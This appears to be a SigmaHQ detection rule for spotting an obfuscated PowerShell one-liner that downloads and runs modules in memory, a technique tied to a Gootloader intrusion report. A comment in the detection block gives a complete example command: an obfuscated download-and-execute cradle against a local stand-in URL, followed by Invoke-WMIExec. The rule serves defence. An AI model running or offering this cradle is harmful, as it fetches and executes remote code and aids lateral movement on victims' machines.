---
title: Obfuscated PowerShell OneLiner Execution
summary: Detects the execution of a specific OneLiner to download and execute powershell modules in memory.
sigma_id: 44e24481-6202-4c62-9127-5a0ae8e3fe3d
status: test
level: high
platform: windows
logsource: windows / process_creation
tactics:
  - TA0002
  - TA0112
techniques:
  - T1059.001
  - T1685
author: '@Kostastsale, TheDFIRReport'
date: '2022-05-09'
modified: '2025-04-16'
falsepositives:
  - Unknown
references:
  - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/
  - https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38
source:
  name: SigmaHQ
  url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_download_cradle_obfuscated.yml
  license: DRL-1.1
  license_url: https://github.com/SigmaHQ/Detection-Rule-License
format: Sigma
---

```yaml
title: Obfuscated PowerShell OneLiner Execution
id: 44e24481-6202-4c62-9127-5a0ae8e3fe3d
status: test
description: Detects the execution of a specific OneLiner to download and execute powershell modules in memory.
references:
    - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/
    - https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38
author: '@Kostastsale, TheDFIRReport'
date: 2022-05-09
modified: 2025-04-16
tags:
    - attack.execution
    - attack.defense-impairment
    - attack.t1059.001
    - attack.t1685
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        # Example: powershell -nop -noni -ep bypass -w h -c "$u=("http://127.0.0.1:1337/"|%%{(IRM $_)});&("".SubString.ToString()[67,72,64]-Join"")($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"
        Image|endswith: '\powershell.exe'
        CommandLine|contains|all:
            - 'http://127.0.0.1'
            - '%{(IRM $_)}'
            - 'Invoke'
    condition: selection
falsepositives:
    - Unknown
level: high
```
